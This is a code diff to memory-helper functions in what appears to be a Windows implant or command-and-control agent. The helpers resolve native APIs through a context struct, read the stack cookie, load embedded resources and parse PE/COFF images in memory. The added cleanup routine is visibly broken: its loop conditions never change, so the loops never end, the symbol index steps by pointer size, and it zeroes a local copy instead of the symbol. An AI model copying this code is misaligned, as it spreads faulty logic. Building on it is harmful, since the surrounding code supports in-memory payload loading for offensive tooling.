@@ -12,7 +12,7 @@ namespace Memory {
         UINT_PTR GetStackCookie() {
 
             uintptr_t cookie = 0;
-            if (!NT_SUCCESS(Ctx->nt.NtQueryInformationProcess(NtCurrentProcess(), (PROCESSINFOCLASS) 0x24, &cookie, 0x4, nullptr))) {
+            if (!NT_SUCCESS(ntstatus = Ctx->nt.NtQueryInformationProcess(NtCurrentProcess(), (PROCESSINFOCLASS) 0x24, &cookie, 0x4, nullptr))) {
                 return 0;
             }
 
@@ -21,13 +21,13 @@ namespace Memory {
 
         _resource* GetIntResource(HMODULE base, const int rsrc_id) {
 
-            HRSRC res_info      = { };
+            HRSRC rsrc_info      = { };
             _resource *object   = (_resource*) Malloc(sizeof(_resource));
 
-            x_assert(res_info          = Ctx->win32.FindResourceA(base, MAKEINTRESOURCE(rsrc_id), RT_RCDATA));
-            x_assert(object->h_global  = Ctx->win32.LoadResource(base, res_info));
-            x_assert(object->size      = Ctx->win32.SizeofResource(base, res_info));
-            x_assert(object->res_lock  = Ctx->win32.LockResource(object->h_global));
+            x_assert(rsrc_info          = Ctx->win32.FindResourceA(base, MAKEINTRESOURCE(rsrc_id), RT_RCDATA));
+            x_assert(object->h_global   = Ctx->win32.LoadResource(base, rsrc_info));
+            x_assert(object->size       = Ctx->win32.SizeofResource(base, rsrc_info));
+            x_assert(object->rsrc_lock  = Ctx->win32.LockResource(object->h_global));
 
         defer:
             return object;
@@ -38,10 +38,10 @@ namespace Memory {
             _executable *image = (_executable*) Malloc(sizeof(_executable));
 
             image->buffer   = data;
-            image->dos_head = (PIMAGE_DOS_HEADER) image->buffer;
-            image->nt_head  = (PIMAGE_NT_HEADERS) (B_PTR(data) + ((PIMAGE_DOS_HEADER) image->buffer)->e_lfanew);
-            image->exports  = (PIMAGE_EXPORT_DIRECTORY) B_PTR(image->buffer) + image->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
-            image->symbol   = (_coff_symbol*) image->buffer + image->nt_head->FileHeader.PointerToSymbolTable;
+            image->dos_head = (PIMAGE_DOS_HEADER) data;
+            image->nt_head  = (PIMAGE_NT_HEADERS) (B_PTR(data) + ((PIMAGE_DOS_HEADER) data)->e_lfanew);
+            image->exports  = (PIMAGE_EXPORT_DIRECTORY) (B_PTR(data) + image->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+            image->symbol   = (_coff_symbol*) (B_PTR(data) + image->nt_head->FileHeader.PointerToSymbolTable);
 
             return image;
         }
@@ -89,7 +89,18 @@ namespace Memory {
             auto free = Ctx->nt.RtlFreeHeap;
             auto heap = Ctx->heap;
 
-            MemSet(Ctx, 0, sizeof(_hexane));
+            // free coff executables
+            for (auto c = 0; Ctx->coffs; c++) {
+                auto head = Ctx->coffs[c];
+
+                ZeroFree(head.buffer, head.size);
+
+                for (auto s = 0; head.symbols; s += sizeof(_coff_symbol*)) {
+                    auto symbol = head.symbols[s];
+
+                    MemSet(&symbol, 0, sizeof(_coff_symbol));
+                }
+            }
 
             if (free) {
                 free(heap, 0, Ctx);
